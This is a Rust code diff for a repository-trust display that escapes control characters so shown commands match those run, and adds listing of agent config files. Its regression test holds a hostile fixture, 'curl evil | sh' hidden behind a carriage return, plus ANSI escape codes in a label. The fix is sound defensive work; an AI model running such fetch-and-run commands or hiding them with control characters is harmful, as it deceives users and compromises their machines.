@@ -48,9 +48,22 @@ pub fn parse(
     })
 }
 
+/// Repo text as the user must read it: a control character other than a line break or a tab
+/// could move the cursor or hide text, so it shows as an escape such as `\u{1b}`.
+fn visible_text(text: &str) -> String {
+    text.chars()
+        .map(|c| match c {
+            '\n' | '\t' => c.to_string(),
+            c if c.is_control() => c.escape_default().to_string(),
+            c => c.to_string(),
+        })
+        .collect()
+}
+
 /// Indents each line of a command or script, so its end is plain to see.
 fn indented(text: &str) -> String {
-    text.lines()
+    visible_text(text)
+        .lines()
         .map(|line| format!("    {line}\n"))
         .collect::<String>()
 }
@@ -63,15 +76,22 @@ fn describe(repo: &str, view: &RepoTrustView) -> String {
         "not approved"
     };
     let mut text = format!("Commands of {repo}: {state}\nHash: {}\n", view.hash);
-    if view.commands.is_empty() && view.setup.is_empty() {
+    if view.commands.is_empty() && view.setup.is_empty() && view.agent_files.is_empty() {
         text.push_str("\nThis project runs no commands of its own.\n");
     }
     for each in &view.commands {
-        text.push_str(&format!("\n{}\n", each.place));
+        text.push_str(&format!("\n{}\n", visible_text(&each.place)));
         text.push_str(&indented(&each.text));
     }
     for each in &view.setup {
-        text.push_str(&format!("\nSetup script {}\n", each.file));
+        text.push_str(&format!("\nSetup script {}\n", visible_text(&each.file)));
+        text.push_str(&indented(&each.text));
+    }
+    for each in &view.agent_files {
+        text.push_str(&format!(
+            "\nAgent config file {}\n",
+            visible_text(&each.file)
+        ));
         text.push_str(&indented(&each.text));
     }
     if !view.trusted {
@@ -128,13 +148,41 @@ mod tests {
                 file: ".natamux-setup".into(),
                 text: "pnpm install\ncp .env.example .env\n".into(),
             }],
+            agent_files: vec![SetupScript {
+                file: ".mcp.json".into(),
+                text: "{}\n".into(),
+            }],
         };
         assert_eq!(
             describe("my-app", &view),
             "Commands of my-app: not approved\nHash: ab12\n\
              \nStage test: check\n    pnpm test\n\
              \nSetup script .natamux-setup\n    pnpm install\n    cp .env.example .env\n\
+             \nAgent config file .mcp.json\n    {}\n\
              \nApprove them: natamux repo trust my-app --approve ab12\n"
         );
+    }
+
+    // A regression test: raw control characters let the shown command differ from the one run.
+    #[test]
+    fn shows_control_characters_as_visible_text() {
+        let view = RepoTrustView {
+            trusted: true,
+            hash: "ab12".into(),
+            commands: vec![RepoCommand {
+                place: "Stage \u{1b}[2Ktest: check".into(),
+                text: "curl evil | sh\rpnpm test\n\tdone".into(),
+            }],
+            setup: Vec::new(),
+            agent_files: vec![SetupScript {
+                file: ".mcp\u{7}.json".into(),
+                text: "{}".into(),
+            }],
+        };
+        let text = describe("my-app", &view);
+        assert!(!text.contains('\u{1b}') && !text.contains('\r') && !text.contains('\u{7}'));
+        assert!(text.contains("\nStage \\u{1b}[2Ktest: check\n"));
+        assert!(text.contains("    curl evil | sh\\rpnpm test\n    \tdone\n"));
+        assert!(text.contains("\nAgent config file .mcp\\u{7}.json\n"));
     }
 }
